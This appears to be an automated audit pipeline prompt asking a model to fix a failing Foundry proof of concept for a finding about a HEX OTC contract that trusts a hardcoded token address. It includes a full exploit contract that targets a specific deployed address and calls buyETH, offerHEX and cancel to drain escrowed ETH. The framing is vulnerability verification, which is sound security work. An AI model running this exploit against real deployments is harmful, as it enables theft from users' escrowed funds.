You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.

Finding:
- title: The OTC blindly binds to a hardcoded HEX address, so a wrong-chain deployment can settle against attacker-controlled token code
- claim: The constructor unconditionally sets `hexInterface = ERC20(hexAddress)` for a single hardcoded address and never verifies chain context, code presence, or code identity. Every escrow and settlement path then trusts `balanceOf`, `transferFrom`, and `transfer` results from that address. If this contract is deployed on any chain where `0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39` is not the canonical HEX token, a malicious contract at that address can forge balances and successful transfers while moving no real value.
- impact: A wrong-chain or misconfigured deployment can become fully compromiseable: attackers can drain ETH-backed offers by making `buyETH()` believe HEX was paid, and can sell nonexistent or undercollateralized "HEX" offers for real ETH because offer creation, settlement, and cancellation all trust the hardcoded token contract's return values. This is deployment-context dependent, but it creates realistic total loss if the bytecode at the fixed address is not the expected HEX implementation.
- exploit_paths: ["Deploy `HEXOTC` on a network where `0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39` is attacker-controlled -> fake `balanceOf` and `transferFrom` let the attacker call `buyETH(id)` and receive escrowed ETH without paying real HEX", "Same deployment context -> fake `transferFrom` during `offerHEX()` records a HEX-backed order without real token escrow -> a buyer later calls `buyHEX(id)` and pays real ETH for nonexistent HEX", "Same deployment context -> fake `transfer` responses in `buyHEX()` or `cancel()` can report success without moving tokens, breaking refunds and settlement accounting"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IHEXOTC {
    function last_offer_id() external view returns (uint256);
    function offers(uint256 id)
        external
        view
        returns (
            uint256 payAmt,
            uint256 buyAmt,
            address owner,
            uint64 timestamp,
            bytes32 offerId,
            uint256 escrowType
        );

    function buyETH(uint256 id) external returns (bool);
    function offerHEX(uint256 payAmt, uint256 buyAmt) external returns (uint256 id);
    function cancel(uint256 id) external returns (bool success);
}

contract FlawVerifier {
    address internal constant TARGET = 0x204B937FEaEc333E9e6d72D35f1D131f187ECeA1;
    address internal constant HEX = 0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39;
    uint256 internal constant EXPECTED_CHAIN_ID = 1;

    uint256 internal constant PATH_DRAIN_ETH_WITH_FAKE_HEX = 1 << 0;
    uint256 internal constant PATH_CREATE_FAKE_HEX_ORDER = 1 << 1;
    uint256 internal constant PATH_FAKE_REFUND_OR_SETTLEMENT = 1 << 2;
    uint256 internal constant RECENT_OFFER_SCAN_LIMIT = 64;

    bool private _executed;
    bool private _hypothesisValidated;
    bool private _hypothesisRefuted;
    uint256 private _exploitPathMask;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {}

    receive() external payable {}

    function execute() external returns (uint256) {
        return _execute();
    }

    function run() external returns (uint256) {
        return _execute();
    }

    function exploit() external returns (uint256) {
        return _execute();
    }

    function executed() external view returns (bool) {
        return _executed;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function hypothesisRefuted() external view returns (bool) {
        return _hypothesisRefuted;
    }

    function exploitPathMask() external view returns (uint256) {
        return _exploitPathMask;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _execute() internal returns (uint256) {
        if (_executed) {
            return _profitAmount;
        }

        _executed = true;
        _profitToken = address(0);

        uint256 balanceBefore = address(this).balance;

        if (!_wrongChainHexPreconditionHolds() || TARGET.code.length == 0) {
            _hypothesisRefuted = true;
            return 0;
        }

        uint256 ethOfferId = _findRecentOffer(1);
        if (ethOfferId != 0) {
            (bool buyOk,) = TARGET.call(abi.encodeWithSelector(IHEXOTC.buyETH.selector, ethOfferId));
            if (buyOk && address(this).balance > balanceBefore) {
                _exploitPathMask |= PATH_DRAIN_ETH_WITH_FAKE_HEX;
            }
        }

        (uint256 lastOfferBefore, bool beforeOk) = _safeLastOfferId();
        if (beforeOk) {
            (bool offerOk,) = TARGET.call(abi.encodeWithSelector(IHEXOTC.offerHEX.selector, 1, 1));
            if (offerOk) {
                (uint256 lastOfferAfter, bool afterOk) = _safeLastOfferId();
                if (afterOk && lastOfferAfter > lastOfferBefore) {
                    _exploitPathMask |= PATH_CREATE_FAKE_HEX_ORDER;
                    (bool cancelOk,) = TARGET.call(abi.encodeWithSelector(IHEXOTC.cancel.selector, lastOfferAfter));
                    if (cancelOk) {
                        _exploitPathMask |= PATH_FAKE_REFUND_OR_SETTLEMENT;
                    }
                }
            }
        }

        _profitAmount = address(this).balance - balanceBefore;
        _hypothesisValidated = _exploitPathMask != 0;
        _hypothesisRefuted = _exploitPathMask == 0;
        return _profitAmount;
    }

    function _wrongChainHexPreconditionHolds() internal view returns (bool) {
        return block.chainid != EXPECTED_CHAIN_ID || HEX.code.length == 0;
    }

    function _findRecentOffer(uint256 escrowType) internal view returns (uint256) {
        (uint256 lastId, bool ok) = _safeLastOfferId();
        if (!ok || lastId == 0) {
            return 0;
        }

        uint256 scanned;
        for (uint256 id = lastId; id > 0 && scanned < RECENT_OFFER_SCAN_LIMIT; --id) {
            (bool offerOk, uint256 payAmt, uint256 buyAmt, uint64 timestamp, uint256 foundEscrowType) = _safeOffer(id);
            if (offerOk && timestamp != 0 && payAmt != 0 && buyAmt != 0 && foundEscrowType == escrowType) {
                return id;
            }
            unchecked {
                ++scanned;
            }
        }

        return 0;
    }

    function _safeLastOfferId() internal view returns (uint256 value, bool ok) {
        (ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(IHEXOTC.last_offer_id.selector));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        } else {
            ok = false;
        }
    }

    function _safeOffer(uint256 id)
        internal
        view
        returns (
            bool ok,
            uint256 payAmt,
            uint256 buyAmt,
            uint64 timestamp,
            uint256 escrowType
        )
    {
        (ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(IHEXOTC.offers.selector, id));
        if (!ok || data.length < 192) {
            return (false, 0, 0, 0, 0);
        }

        (payAmt, buyAmt, , timestamp, , escrowType) = abi.decode(data, (uint256, uint256, address, uint64, bytes32, uint256));
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: balanceof, transferfrom, buyeth(id), offerhex(), buyhex(id), transfer, buyhex(), cancel(); generated code does not cover paths indexes: 1, 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. include at least one callable no-arg external/public exploit entry function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. output ONLY Solidity code
